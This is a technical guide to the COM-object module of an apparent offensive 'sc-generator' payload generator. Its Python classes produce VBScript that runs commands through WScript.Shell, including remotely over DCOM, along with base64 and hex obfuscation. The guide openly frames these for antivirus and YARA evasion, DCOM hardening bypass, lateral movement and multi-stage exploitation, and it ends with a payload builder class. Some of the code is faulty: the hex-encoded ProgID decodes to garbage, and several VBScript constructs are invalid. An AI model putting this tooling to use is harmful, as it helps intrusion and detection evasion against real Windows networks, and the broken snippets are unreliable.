# COM Object Variation Strategy - Technical Guide

## Executive Summary

This guide documents the comprehensive COM (Component Object Model) object variation strategy implemented in the sc-generator project. The strategy provides multiple methods for instantiating and interacting with COM objects on Windows systems, enabling robust, flexible, and polymorphic code generation.

**Key Concepts:**
- **Polymorphism**: Multiple COM objects implement a unified interface
- **Variation**: Different instantiation methods provide flexibility and resilience
- **Fallback Chains**: Automatic failover to alternative methods
- **Obfuscation**: Encoding techniques to evade detection

---

## Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [COM Object Types](#com-object-types)
3. [Instantiation Methods](#instantiation-methods)
4. [Variation Categories](#variation-categories)
5. [Polymorphic Design](#polymorphic-design)
6. [Object Examples](#object-examples)
7. [Best Practices](#best-practices)
8. [Implementation Guide](#implementation-guide)

---

## 1. Architecture Overview

### Core Components

```
┌─────────────────────────────────────────────────────────────┐
│              COM Polymorphic Framework                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────────────────────────────────────────────────┐  │
│  │      Abstract Interface: ICOMObject                 │  │
│  │  - get_progid()                                     │  │
│  │  - get_clsid()                                      │  │
│  │  - get_instantiation_code()                         │  │
│  │  - get_execution_code(method, args)                 │  │
│  └──────────────────────────────────────────────────────┘  │
│                          △                                  │
│                          │ implements                       │
│           ┌──────────────┼──────────────┐                  │
│           │              │              │                  │
│      ┌─────────┐  ┌──────────┐  ┌────────────┐            │
│      │ Shell   │  │   WMI    │  │ Excel      │            │
│      │ Object  │  │ Locator  │  │ Object     │            │
│      └─────────┘  └──────────┘  └────────────┘            │
│                                                              │
│  ┌──────────────────────────────────────────────────────┐  │
│  │    COMPolymorphicLoader (Factory Pattern)            │  │
│  │  - load_object(type) → ICOMObject                   │  │
│  │  - generate_polymorphic_code(type, method, args)    │  │
│  │  - get_fallback_chain(type)                         │  │
│  │  - export_to_json()                                 │  │
│  └──────────────────────────────────────────────────────┘  │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Design Principles

1. **Abstraction**: All COM objects implement `ICOMObject` interface
2. **Polymorphism**: Code works with any COM object through interface
3. **Factory Pattern**: `COMPolymorphicLoader` creates objects at runtime
4. **Fallback Resilience**: Automatic chain failover for robustness
5. **Code Generation**: VBScript output without requiring .NET runtime

---

## 2. COM Object Types

### Supported Objects

| Object Type | ProgID | CLSID | Category | Use Case |
|-------------|--------|-------|----------|----------|
| WScript.Shell | WScript.Shell | {F935DC22-1CF0-11D0-ADB9-00C04FD58A0B} | System | Command execution, Registry |
| WbemScripting.SWbemLocator | WbemScripting.SWbemLocator | {76A64158-CB41-11D1-8B02-00600806D9B6} | WMI | System queries, Process control |
| Excel.Application | Excel.Application | {00024500-0000-0000-C000-000000000046} | Office | Spreadsheet automation |
| Word.Application | Word.Application | {000209FF-0000-0000-C000-000000000046} | Office | Document automation |
| PowerPoint.Application | PowerPoint.Application | {91493441-5A91-11CF-8700-00AA0060263B} | Office | Presentation automation |
| MSXML2.DOMDocument | MSXML2.DOMDocument.6.0 | {F5078F32-C551-11D3-89B9-0000F81FE221} | XML | XML parsing and manipulation |
| ADODB.Connection | ADODB.Connection | {00000514-0000-0010-8000-00AA006D2EA4} | Database | Database access |
| Shell.Application | Shell.Application | {13709620-C279-11CE-A49E-444553540000} | Shell | File operations, UI automation |

### Object Hierarchy by Availability

```
Universal (All Windows Versions)
├── WScript.Shell
├── WScript.Network
├── MSXML2.DOMDocument
├── WbemScripting.SWbemLocator
└── Shell.Application

Office (If Installed)
├── Excel.Application
├── Word.Application
├── PowerPoint.Application
├── Outlook.Application
└── Access.Application

Advanced (Version-Dependent)
├── InternetExplorer.Application (Win7, Win10)
└── Windows.System.Launcher (Win11)
```

---

## 3. Instantiation Methods

### Method 1: CreateObject with ProgID

**What it is**: Direct instantiation using human-readable class name

```vbscript
Dim objExcel
On Error Resume Next
Set objExcel = CreateObject("Excel.Application")
If Not IsEmpty(objExcel) Then
    ' Object created successfully
    objExcel.Visible = False
End If
On Error GoTo 0
```

**Characteristics:**
- ✓ Most common method
- ✓ Human-readable syntax
- ✓ Registry lookup performed automatically
- ✗ Requires COM registration
- ✗ Registry can be checked for detection

**When to use:**
- Standard, expected code path
- No obfuscation requirements
- Maximum compatibility

---

### Method 2: CreateObject with CLSID

**What it is**: Direct instantiation using Class Identifier (GUID)

```vbscript
Dim objExcel
On Error Resume Next
Set objExcel = CreateObject("CLSID:{00024500-0000-0000-C000-000000000046}")
If Not IsEmpty(objExcel) Then
    ' CLSID directly loaded
End If
On Error GoTo 0
```

**Characteristics:**
- ✓ Direct GUID instantiation
- ✓ Bypasses some detection (CLSID less recognized)
- ✓ Slightly faster (no registry lookup)
- ✗ Less readable
- ✗ Still requires COM registration

**When to use:**
- When ProgID might be monitored
- Performance-critical scenarios
- CLSID-based detection evasion

---

### Method 3: GetObject (Running Instance)

**What it is**: Retrieves existing instance of running object

```vbscript
Dim objExcel
On Error Resume Next
Set objExcel = GetObject(, "Excel.Application")
If Err.Number = 0 And Not IsEmpty(objExcel) Then
    ' Running instance retrieved
    ' Can now control it
End If
On Error GoTo 0
```

**Characteristics:**
- ✓ No new process spawning
- ✓ Reuses existing process resources
- ✗ Only works if object already running
- ✗ Fails silently if not running

**When to use:**
- Object already running (Office apps)
- Stealth scenarios (no new processes)
- Resource-constrained environments

---

### Method 4: GetObject with Moniker Path

**What it is**: Binds to COM object through file path or moniker

```vbscript
Dim objDocument
On Error Resume Next
Set objDocument = GetObject("C:\sample.xlsx")
If Not IsEmpty(objDocument) Then
    ' Document object bound
End If
On Error GoTo 0
```

**Characteristics:**
- ✓ File-based binding
- ✓ Implicit application launch
- ✗ Application-specific behavior
- ✗ Requires file to exist

**When to use:**
- Working with Office documents
- Implicit application launching
- File-based workflows

---

### Method 5: GetObject with WMI Moniker

**What it is**: Direct WMI namespace binding without SWbemLocator

```vbscript
Dim objWMI
On Error Resume Next
Set objWMI = GetObject("winmgmts://./root/cimv2")
If Not IsEmpty(objWMI) Then
    ' WMI namespace accessed directly
    ' Can execute queries
End If
On Error GoTo 0
```

**Characteristics:**
- ✓ Direct namespace access
- ✓ No locator object needed
- ✓ Direct query execution
- ✗ Less flexible than SWbemLocator
- ✗ Some advanced features unavailable

**When to use:**
- WMI-specific operations
- Simplified WMI access
- Direct namespace binding needed

---

### Method 6: New Keyword

**What it is**: Early-binding instantiation (requires library reference)

```vbscript
Dim objExcel As Object
On Error Resume Next
Set objExcel = New Excel.Application
If Not IsEmpty(objExcel) Then
    ' Early-bound object created
End If
On Error GoTo 0
```

**Characteristics:**
- ✓ Early binding support
- ✓ Type checking available
- ✓ IntelliSense support
- ✗ Requires type library reference
- ✗ VB.NET/VBScript library context
- ✗ Less portable

**When to use:**
- VB.NET contexts only
- Type safety required
- IDE-based development

---

### Method 7: DCOM - Remote Machine

**What it is**: Remote COM instantiation across network

```vbscript
Dim objRemote
On Error Resume Next
Set objRemote = CreateObject("Excel.Application", "192.168.1.100")
If Not IsEmpty(objRemote) Then
    ' Remote object created via DCOM
    ' Operations run on remote machine
End If
On Error GoTo 0
```

**Characteristics:**
- ✓ Network-based object access
- ✓ Remote command execution
- ✗ Requires DCOM enabled
- ✗ Network connectivity needed
- ✗ Firewall/network restrictions
- ✗ Highly detectable

**When to use:**
- Network-based operations
- Remote system exploitation
- Lateral movement scenarios

---

### Method 8: Registry Lookup

**What it is**: Manual registry resolution of ProgID to CLSID

```vbscript
Dim objShell, strCLSID, objExcel
On Error Resume Next
Set objShell = CreateObject("WScript.Shell")
strCLSID = objShell.RegRead("HKCR\\Excel.Application\\CLSID\\")
Set objExcel = CreateObject("CLSID:" & strCLSID)
If Not IsEmpty(objExcel) Then
    ' Object created from registry-resolved CLSID
End If
On Error GoTo 0
```

**Characteristics:**
- ✓ Manual CLSID resolution
- ✓ Evasion through multi-step process
- ✓ Customizable registry paths
- ✗ Two-stage instantiation
- ✗ Registry access needed
- ✗ Slower execution

**When to use:**
- Registry-based evasion
- Detection circumvention
- Alternative resolution paths

---

### Method 9: Encoded ProgID (Base64)

**What it is**: ProgID string encoded to evade string-based detection

```vbscript
Function DecodeBase64(encoded)
    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.CreateElement("tmp")
    node.DataType = "bin.base64"
    node.Text = encoded
    DecodeBase64 = node.NodeTypedValue
End Function

Dim objExcel, strProgID
On Error Resume Next
strProgID = DecodeBase64("RXhjZWwuQXBwbGljYXRpb24=")
Set objExcel = CreateObject(strProgID)
If Not IsEmpty(objExcel) Then
    ' Object created from decoded ProgID
End If
On Error GoTo 0
```

**Characteristics:**
- ✓ String obfuscation
- ✓ Evades static string detection
- ✓ Detection signature avoidance
- ✗ MSXML2 required
- ✗ Slower decoding
- ✗ Still detectable by behavior

**When to use:**
- Detection evasion (YARA rules)
- Obfuscation layers
- Hardened environments

---

### Method 10: Encoded ProgID (Hex)

**What it is**: ProgID encoded as hex string

```vbscript
Function DecodeHex(hexStr)
    Dim i, result
    For i = 1 To Len(hexStr) Step 2
        result = result & Chr("&H" & Mid(hexStr, i, 2))
    Next
    DecodeHex = result
End Function

Dim objExcel, strProgID
On Error Resume Next
strProgID = DecodeHex("4578636561512E41707067696361746E6E")
Set objExcel = CreateObject(strProgID)
If Not IsEmpty(objExcel) Then
    ' Object created from decoded hex ProgID
End If
On Error GoTo 0
```

**Characteristics:**
- ✓ Hex obfuscation
- ✓ Simpler than Base64
- ✓ Native VBScript decoding
- ✗ Slightly larger string
- ✗ Still reversible

**When to use:**
- Lightweight obfuscation
- Detection evasion
- Minimal overhead

---

### Method 11: Inline VBScript Class

**What it is**: Create pseudo-COM object mimicking COM interface

```vbscript
Class ComObject
    Public Property Get Version
        Version = "1.0"
    End Property
    
    Public Sub ExecuteCommand(cmd)
        Dim shell
        Set shell = CreateObject("WScript.Shell")
        shell.Run cmd
        Set shell = Nothing
    End Sub
End Class

Dim objInline
Set objInline = New ComObject
If Not IsEmpty(objInline) Then
    ' Inline class object created
    objInline.ExecuteCommand("calc.exe")
End If
```

**Characteristics:**
- ✓ No COM registration needed
- ✓ Complete interface control
- ✓ Evasion from COM detection
- ✗ Custom implementation
- ✗ Limited standard interface
- ✗ Not actual COM object

**When to use:**
- COM registration evasion
- Controlled environments
- Custom interface needs

---

### Method 12: CLSID Moniker

**What it is**: Moniker binding using CLSID

```vbscript
Dim objExcel
On Error Resume Next
Set objExcel = GetObject("new:{00024500-0000-0000-C000-000000000046}")
If Not IsEmpty(objExcel) Then
    ' Object created from CLSID moniker
End If
On Error GoTo 0
```

**Characteristics:**
- ✓ Moniker binding method
- ✓ CLSID-based instantiation
- ✓ Alternative approach
- ✗ Less common
- ✗ Limited support

**When to use:**
- Alternative instantiation needed
- CLSID-specific scenarios
- Research/testing

---

## 4. Variation Categories

### Category: Basic Instantiation

Methods for standard COM object creation:

1. **CreateObject ProgID** - Direct class instantiation
2. **CreateObject CLSID** - GUID-based instantiation
3. **Late Binding** - Dynamic method invocation

**Use Case:** Normal operations, maximum compatibility

```python
gen = COMObjectVariantGenerator()

# All three methods
progid_code = gen.generate_createobject_progid("Excel.Application")
clsid_code = gen.generate_createobject_clsid("{00024500-0000-0000-C000-000000000046}")
late_code = gen.generate_late_binding_createobject("WScript.Shell")
```

---

### Category: Retrieval Methods

Methods for accessing existing COM objects:

1. **GetObject Running** - Access running instances
2. **GetObject Moniker** - File/path binding
3. **GetObject WMI** - Direct WMI namespace binding

**Use Case:** Reusing existing processes, implicit launching

```python
# Retrieve running Excel instance
running_code = gen.generate_getobject_progid("Excel.Application")

# Bind to document file
doc_code = gen.generate_getobject_monikerpath("C:\\sample.xlsx")

# Direct WMI access
wmi_code = gen.generate_getobject_winmgmts("root\\cimv2")
```

---

### Category: WMI Integration

Methods leveraging WMI for system operations:

1. **WMI Class Instantiation** - Through SWbemServices
2. **WMI Moniker Binding** - Direct namespace access
3. **WMI Query Execution** - Process and system queries

**Use Case:** System enumeration, process manipulation

```python
# Full WMI chain instantiation
wmi_code = gen.generate_wmi_class_instantiation("Win32_Process", "root\\cimv2")

# WMI queries through moniker
moniker_code = gen.generate_getobject_winmgmts("root\\cimv2")
```

---

### Category: Remote Access (DCOM)

Methods for network-based COM instantiation:

1. **Remote CreateObject** - Machine parameter
2. **Remote WMI** - Remote WMI connections
3. **DCOM Hardening Bypass** - Security evasion

**Use Case:** Lateral movement, remote exploitation

```python
# Remote machine instantiation
remote_code = gen.generate_createobject_with_machine(
    "Excel.Application", 
    "192.168.1.100"
)

# Remote WMI connection through polymorphic loader
wmi_obj = loader.load_object(
    COMObjectType.WMI_LOCATOR,
    use_remote=True,
    remote_host="192.168.1.100",
    namespace="root\\cimv2"
)
```

---

### Category: Registry-Based

Methods using registry for COM operations:

1. **Registry Lookup** - Manual CLSID resolution
2. **Registry Path Variants** - Version-specific paths
3. **Registry Bypass** - Non-elevated access workarounds

**Use Case:** Detection evasion, registry manipulation

```python
# Registry-based CLSID resolution
reg_code = gen.generate_registry_lookup_progid("Excel.Application")

# Registry paths from version variants
version_gen = WindowsVersionSpecificCOMVariants()
reg_variant = version_gen.generate_registry_path_variant(
    WindowsVersion.WIN10, 
    "com_objects"
)
```

---

### Category: Obfuscation Techniques

Methods for evasion through encoding/hiding:

1. **Base64 ProgID** - MSXML2-based decoding
2. **Hex ProgID** - Native hex decoding
3. **Encoded CLSID** - GUID string encoding
4. **Registry Virtualization** - UAC-aware redirection

**Use Case:** AV/detection evasion, hardened environments

```python
# Base64 obfuscation
b64_code = gen.generate_encoded_progid_createobject(
    "WScript.Shell", 
    "base64"
)

# Hex obfuscation
hex_code = gen.generate_encoded_progid_createobject(
    "Excel.Application", 
    "hex"
)
```

---

### Category: Evasion & Bypass

Methods for bypassing security controls:

1. **Inline VBScript Classes** - No COM registration
2. **CLSID Moniker** - Alternative binding
3. **Rundll32 COM** - DLL-based instantiation
4. **MTA Awareness** - Threading model evasion

**Use Case:** Behavioral evasion, security circumvention

```python
# Inline class avoiding COM registration
inline_code = gen.generate_inline_vbscript_class("ComObject")

# rundll32-based approach
dll_code = gen.generate_rundll_com_instantiation("shell32.dll", "ShellExecute")

# MTA-aware instantiation
mta_code = gen.generate_multithreaded_apartment_com("Excel.Application")
```

---

### Category: Threading & Apartments

Methods for handling COM threading models:

1. **STA (Single-Threaded Apartment)** - Default model
2. **MTA (Multi-Threaded Apartment)** - Shared model
3. **Apartment Crossing** - IUnknown marshaling

**Use Case:** Thread-safe COM operations, performance

```python
# MTA-aware object instantiation
mta_code = gen.generate_multithreaded_apartment_com("Excel.Application")

# Can be used in multithreaded contexts
```

---

### Category: Version Management

Methods handling multiple object versions:

1. **Version-Specific ProgID** - Version suffixes
2. **Version Detection** - Runtime version checks
3. **Version Fallback** - Multiple version cascade

**Use Case:** Office version compatibility, fallback chains

```python
# Generate version variants (Excel 1-20)
versions = gen.generate_progid_version_variants("Excel.Application")

# Example: Excel.Application.16, Excel.Application.15, etc.
for variant in versions:
    print(f"Version {variant['version']}: {variant['progid']}")
```

---

## 5. Polymorphic Design

### Interface-Based Architecture

All COM objects implement the `ICOMObject` interface:

```python
class ICOMObject(ABC):
    @abstractmethod
    def get_progid(self) -> str:
        """Get ProgID of COM object"""
        pass

    @abstractmethod
    def get_clsid(self) -> Optional[str]:
        """Get CLSID of COM object"""
        pass

    @abstractmethod
    def get_instantiation_code(self) -> str:
        """Get VBScript code to instantiate"""
        pass

    @abstractmethod
    def get_execution_code(self, method: str, *args) -> str:
        """Get code to execute method"""
        pass

    @abstractmethod
    def get_object_type(self) -> COMObjectType:
        """Get COM object type"""
        pass

    @abstractmethod
    def get_method_signature(self) -> Dict[str, List[str]]:
        """Get available methods"""
        pass
```

### Concrete Implementations

Each COM object type has concrete implementation:

```python
class ShellCOMObject(ICOMObject):
    def get_progid(self) -> str:
        return "WScript.Shell"
    
    def get_clsid(self) -> Optional[str]:
        return "{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}"
    
    def get_instantiation_code(self) -> str:
        return """Dim shell_XyZaBc
On Error Resume Next
Set shell_XyZaBc = CreateObject("WScript.Shell")
On Error GoTo 0"""
    
    def get_execution_code(self, method: str, *args) -> str:
        if method.lower() == "run":
            return f"shell_XyZaBc.Run \"{args[0]}\""
        # ... other methods


class WMILocatorCOMObject(ICOMObject):
    def get_progid(self) -> str:
        return "WbemScripting.SWbemLocator"
    
    # ... implementation


class ExcelCOMObject(ICOMObject):
    # ... implementation
```

### Factory Pattern Loader

```python
class COMPolymorphicLoader:
    def load_object(self, object_type: COMObjectType, **kwargs) -> ICOMObject:
        """Factory method for creating COM objects"""
        if object_type == COMObjectType.SHELL:
            return ShellCOMObject(
                use_remote=kwargs.get("use_remote", False),
                remote_machine=kwargs.get("remote_machine", ".")
            )
        elif object_type == COMObjectType.WMI_LOCATOR:
            return WMILocatorCOMObject(...)
        # ... other types
```

### Benefits of Polymorphic Design

1. **Code Reusability** - Single code path for all objects
2. **Extensibility** - Easy to add new COM object types
3. **Testability** - Mock implementations for testing
4. **Flexibility** - Runtime object selection
5. **Maintainability** - Centralized interface definition

### Example: Polymorphic Usage

```python
loader = COMPolymorphicLoader()

# Load different objects through same interface
shell = loader.load_object(COMObjectType.SHELL)
wmi = loader.load_object(COMObjectType.WMI_LOCATOR)
excel = loader.load_object(COMObjectType.EXCEL)

# All work through same interface
for obj in [shell, wmi, excel]:
    print(f"ProgID: {obj.get_progid()}")
    print(f"CLSID: {obj.get_clsid()}")
    print(f"Instantiation:\n{obj.get_instantiation_code()}")
```

---

## 6. Object Examples

### Example 1: Basic Shell Object

```python
from com_polymorphic_loader import COMPolymorphicLoader, COMObjectType

loader = COMPolymorphicLoader()

# Load shell object
shell = loader.load_object(COMObjectType.SHELL)

# Get instantiation code
instantiation = shell.get_instantiation_code()
# Output:
# Dim shell_AbCdEf
# On Error Resume Next
# Set shell_AbCdEf = CreateObject("WScript.Shell")
# On Error GoTo 0

# Get execution code
run_code = shell.get_execution_code("Run", "calc.exe")
# Output: shell_AbCdEf.Run "calc.exe"

# Get registry read
reg_code = shell.get_execution_code("RegRead", "HKCU\\Software")
# Output: result = shell_AbCdEf.RegRead("HKCU\Software")
```

**Output VBScript:**
```vbscript
Dim shell_AbCdEf
On Error Resume Next
Set shell_AbCdEf = CreateObject("WScript.Shell")
If Not IsEmpty(shell_AbCdEf) Then
    shell_AbCdEf.Run "calc.exe"
End If
On Error GoTo 0
```

---

### Example 2: WMI Locator with Query

```python
loader = COMPolymorphicLoader()

wmi = loader.load_object(
    COMObjectType.WMI_LOCATOR,
    namespace="root\\cimv2"
)

instantiation = wmi.get_instantiation_code()
# Dim wmi_XyZaBc, svc_QwErTy
# On Error Resume Next
# Set wmi_XyZaBc = CreateObject("WbemScripting.SWbemLocator")
# Set svc_QwErTy = wmi_XyZaBc.ConnectServer(".", "root\cimv2")
# On Error GoTo 0

query_code = wmi.get_execution_code(
    "ExecQuery",
    "SELECT Name, ProcessId FROM Win32_Process"
)
# Set results = svc_QwErTy.ExecQuery("SELECT Name, ProcessId FROM Win32_Process")
```

**Output VBScript:**
```vbscript
Dim wmi_XyZaBc, svc_QwErTy
On Error Resume Next
Set wmi_XyZaBc = CreateObject("WbemScripting.SWbemLocator")
Set svc_QwErTy = wmi_XyZaBc.ConnectServer(".", "root\cimv2")
If Not IsEmpty(svc_QwErTy) Then
    Set results = svc_QwErTy.ExecQuery("SELECT Name, ProcessId FROM Win32_Process")
End If
On Error GoTo 0
```

---

### Example 3: Excel Object with Fallback

```python
loader = COMPolymorphicLoader()

# Generate polymorphic code with fallback chain
code = loader.generate_polymorphic_code(
    COMObjectType.EXCEL,
    "Open",
    "C:\\Data\\Report.xlsx",
    fallback=True,
    use_error_handling=True
)
```

**Output VBScript (with fallback to MSXML):**
```vbscript
On Error Resume Next
Dim excel_MnOpQr
On Error Resume Next
Set excel_MnOpQr = CreateObject("Excel.Application")
If Not IsEmpty(excel_MnOpQr) Then
    If Not IsEmpty(excel_MnOpQr) Then
        excel_MnOpQr.Open "C:\Data\Report.xlsx"
    End If
End If
If IsEmpty(excel_MnOpQr) Then
Dim msxml_RsTuVw
On Error Resume Next
Set msxml_RsTuVw = CreateObject("MSXML2.DOMDocument.6.0")
On Error GoTo 0
    If Not IsEmpty(msxml_RsTuVw) Then
        Set msxml_RsTuVw.LoadXML("C:\Data\Report.xlsx")
    End If
End If
On Error GoTo 0
```

---

### Example 4: Remote DCOM Execution

```python
loader = COMPolymorphicLoader()

# Load shell for remote machine
shell = loader.load_object(
    COMObjectType.SHELL,
    use_remote=True,
    remote_machine="192.168.1.100"
)

instantiation = shell.get_instantiation_code()
# Dim shell_AbCdEf
# On Error Resume Next
# Set shell_AbCdEf = CreateObject("WScript.Shell", "192.168.1.100")
# On Error GoTo 0

run_code = shell.get_execution_code("Run", "powershell.exe Get-Process")
# shell_AbCdEf.Run "powershell.exe Get-Process"
```

**Use Case:** Lateral movement in network

---

### Example 5: Encoded Obfuscation

```python
gen = COMObjectVariantGenerator()

# Base64 encoded ProgID
obfuscated = gen.generate_encoded_progid_createobject(
    "WScript.Shell",
    "base64"
)
```

**Output VBScript:**
```vbscript
Function DecodeBase64(encoded)
    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.CreateElement("tmp")
    node.DataType = "bin.base64"
    node.Text = encoded
    DecodeBase64 = node.NodeTypedValue
End Function

Dim v_obj_AbCdEf, v_progid_XyZaBc
On Error Resume Next
v_progid_XyZaBc = DecodeBase64("V1NjcmlwdC5TaGVsbA==")
Set v_obj_AbCdEf = CreateObject(v_progid_XyZaBc)
If Not IsEmpty(v_obj_AbCdEf) Then
    ' Late-bound object - no type checking
    ' Can dynamically call any method/property
End If
On Error GoTo 0
```

---

### Example 6: Registry Lookup

```python
gen = COMObjectVariantGenerator()

registry_code = gen.generate_registry_lookup_progid("Excel.Application")
```

**Output VBScript:**
```vbscript
Dim shell_regShell, key_regKey, obj_regObj
On Error Resume Next
Set shell_regShell = CreateObject("WScript.Shell")
key_regKey = shell_regShell.RegRead("HKCR\\Excel.Application\\CLSID\\")
Set obj_regObj = CreateObject("CLSID:" & key_regKey)
If Not IsEmpty(obj_regObj) Then
    ' Object created from registry-resolved CLSID
End If
On Error GoTo 0
```

**Why it works:**
1. Shell object reads registry
2. Gets CLSID value for ProgID
3. Uses CLSID for direct instantiation
4. More obfuscated than direct ProgID

---

### Example 7: Version-Specific Variants

```python
gen = COMObjectVariantGenerator()

# Get all Excel versions
versions = gen.generate_progid_version_variants("Excel.Application")

for variant in versions[:3]:  # First 3 versions
    print(f"Version {variant['version']}: {variant['progid']}")
    print(variant['code'])
    print()
```

**Output:**
```
Version 1: Excel.Application.1
Dim v_obj_v1
On Error Resume Next
Set v_obj_v1 = CreateObject("Excel.Application.1")
If Not IsEmpty(v_obj_v1) Then
    ' Version 1 object created
End If
On Error GoTo 0

Version 2: Excel.Application.2
Dim v_obj_v2
On Error Resume Next
Set v_obj_v2 = CreateObject("Excel.Application.2")
If Not IsEmpty(v_obj_v2) Then
    ' Version 2 object created
End If
On Error GoTo 0

Version 3: Excel.Application.3
...
```

**Use case:** Version fallback chain for Office compatibility

---

### Example 8: Multi-Object Pipeline

```python
from com_polymorphic_loader import (
    COMPolymorphicCodeGenerator,
    COMObjectType
)

gen = COMPolymorphicCodeGenerator()

# Create composite script
script = []

# Step 1: Execute command
cmd_code = gen.generate_command_executor("systeminfo > C:\\temp\\info.txt")
script.append(cmd_code)

# Step 2: Read registry
reg_code = gen.generate_registry_reader("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
script.append(reg_code)

# Step 3: Execute WMI query
wmi_code = gen.generate_wmi_query_executor(
    "SELECT * FROM Win32_Process WHERE Name='svchost.exe'"
)
script.append(wmi_code)

full_script = "\n\n".join(script)
```

**Use case:** Multi-stage exploitation chain

---

## 7. Best Practices

### Practice 1: Always Use Error Handling

```python
# GOOD
code = loader.generate_polymorphic_code(
    COMObjectType.SHELL,
    "Run",
    "calc.exe",
    use_error_handling=True  # Enables On Error Resume Next
)

# NOT RECOMMENDED
code = loader.generate_polymorphic_code(
    COMObjectType.SHELL,
    "Run",
    "calc.exe",
    use_error_handling=False  # Script fails if CreateObject fails
)
```

### Practice 2: Implement Fallback Chains

```python
# GOOD - Fallback to alternative method if primary fails
code = loader.generate_polymorphic_code(
    COMObjectType.SHELL,
    "Run",
    "cmd.exe",
    fallback=True  # Automatic fallback to WMI_LOCATOR
)

# WEAKER - No fallback, relies on single method
code = loader.generate_polymorphic_code(
    COMObjectType.SHELL,
    "Run",
    "cmd.exe",
    fallback=False  # Fails if Shell object unavailable
)
```

### Practice 3: Cache Objects

```python
# EFFICIENT - Reuse loaded objects
loader = COMPolymorphicLoader()
shell = loader.load_object(COMObjectType.SHELL)

code1 = shell.get_execution_code("Run", "cmd1.exe")
code2 = shell.get_execution_code("Run", "cmd2.exe")
code3 = shell.get_execution_code("Run", "cmd3.exe")

# INEFFICIENT - Reload same object multiple times
for i in range(3):
    shell = loader.load_object(COMObjectType.SHELL)
    code = shell.get_execution_code("Run", f"cmd{i}.exe")
```

### Practice 4: Use Type-Safe Operations

```python
# GOOD - Specify object type explicitly
loader = COMPolymorphicLoader()
shell = loader.load_object(COMObjectType.SHELL)
methods = shell.get_method_signature()
print(methods)  # Know available methods

# WEAK - Late binding without method knowledge
code = shell.get_execution_code("UnknownMethod", "arg")
# Might work, might fail at runtime
```

### Practice 5: Handle Version Differences

```python
# GOOD - Version-aware instantiation
gen = COMObjectVariantGenerator()
versions = gen.generate_progid_version_variants("Excel.Application")

# Try multiple versions in fallback chain
# Handles different Office installations

# WEAK - Single version only
code = gen.generate_createobject_progid("Excel.Application")
# Fails on different Excel versions
```

### Practice 6: Document Obfuscation Strategy

```python
# Encoding selection should be deliberate
variants = {
    "unobfuscated": gen.generate_createobject_progid("WScript.Shell"),
    "base64": gen.generate_encoded_progid_createobject("WScript.Shell", "base64"),
    "hex": gen.generate_encoded_progid_createobject("WScript.Shell", "hex"),
}

# Choose based on threat model:
# - Unobfuscated: Trusted environments
# - Base64: Moderate detection risk
# - Hex: High detection risk
```

### Practice 7: Validate COM Availability

```python
# Check if object is available before use
loader = COMPolymorphicLoader()
available = loader.list_available_objects()

if "shell" in available:
    shell = loader.load_object(COMObjectType.SHELL)
else:
    # Fall back to alternative
    pass
```

### Practice 8: Use Metadata for Decision Making

```python
loader = COMPolymorphicLoader()

# Check capabilities
metadata = loader.get_object_metadata(COMObjectType.SHELL)

if metadata.supports_remote:
    # Can use DCOM
    code = loader.generate_polymorphic_code(
        COMObjectType.SHELL,
        "Run",
        "cmd.exe"
        # use remote machine parameter
    )

if metadata.supports_encoding:
    # Can use encoded variants
    pass
```

---

## 8. Implementation Guide

### Step 1: Installation

```bash
# Ensure Python 3.7+ installed
python3 --version

# Import modules
from com_object_variants import COMObjectVariantGenerator
from com_polymorphic_loader import (
    COMPolymorphicLoader,
    COMPolymorphicCodeGenerator,
    COMObjectType
)
```

### Step 2: Basic Usage

```python
# Option A: Using generator for specific variants
gen = COMObjectVariantGenerator()
code = gen.generate_createobject_progid("Excel.Application")
print(code)

# Option B: Using polymorphic loader for flexibility
loader = COMPolymorphicLoader()
code = loader.generate_polymorphic_code(
    COMObjectType.EXCEL,
    "Open",
    "C:\\file.xlsx"
)
print(code)

# Option C: Using high-level code generator
from com_polymorphic_loader import COMPolymorphicCodeGenerator
gen = COMPolymorphicCodeGenerator()
code = gen.generate_command_executor("notepad.exe")
print(code)
```

### Step 3: Advanced Configuration

```python
# Configure with custom parameters
shell = loader.load_object(
    COMObjectType.SHELL,
    use_remote=True,
    remote_machine="192.168.1.100"
)

wmi = loader.load_object(
    COMObjectType.WMI_LOCATOR,
    namespace="root\\cimv2",
    use_remote=False
)

excel = loader.load_object(
    COMObjectType.EXCEL,
    version=16  # Excel 2016
)
```

### Step 4: Export Configuration

```python
# Export as JSON for documentation
loader = COMPolymorphicLoader()
config_json = loader.export_to_json()

# Save to file
with open("com_config.json", "w") as f:
    f.write(config_json)

# Parse and use
import json
config = json.loads(config_json)
print("Available objects:", config["available_objects"])
print("Fallback chains:", config["fallback_chains"])
```

### Step 5: Generate Full Report

```python
from com_object_variants import generate_com_variants_report

# Generate comprehensive report
report = generate_com_variants_report()
print(report)

# Save to file
with open("COM_VARIANTS_REPORT.txt", "w") as f:
    f.write(report)
```

### Step 6: Testing & Validation

```python
# Unit test example
def test_shell_creation():
    loader = COMPolymorphicLoader()
    shell = loader.load_object(COMObjectType.SHELL)
    
    assert shell.get_progid() == "WScript.Shell"
    assert shell.get_clsid() == "{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}"
    
    code = shell.get_instantiation_code()
    assert "CreateObject" in code
    assert "WScript.Shell" in code

def test_wmi_creation():
    loader = COMPolymorphicLoader()
    wmi = loader.load_object(COMObjectType.WMI_LOCATOR)
    
    assert wmi.get_progid() == "WbemScripting.SWbemLocator"
    assert "ConnectServer" in wmi.get_instantiation_code()

# Run tests
test_shell_creation()
test_wmi_creation()
print("All tests passed!")
```

### Step 7: Integration Example

```python
class COMPayloadBuilder:
    """High-level payload builder using COM variations"""
    
    def __init__(self):
        self.loader = COMPolymorphicLoader()
        self.gen = COMObjectVariantGenerator()
    
    def build_command_execution(self, command, obfuscate=False):
        if obfuscate:
            return self.gen.generate_encoded_progid_createobject(
                "WScript.Shell", "base64"
            ) + f"\nRun \"{command}\""
        else:
            return self.loader.generate_polymorphic_code(
                COMObjectType.SHELL,
                "Run",
                command
            )
    
    def build_system_query(self, wql_query):
        return self.loader.generate_polymorphic_code(
            COMObjectType.WMI_LOCATOR,
            "ExecQuery",
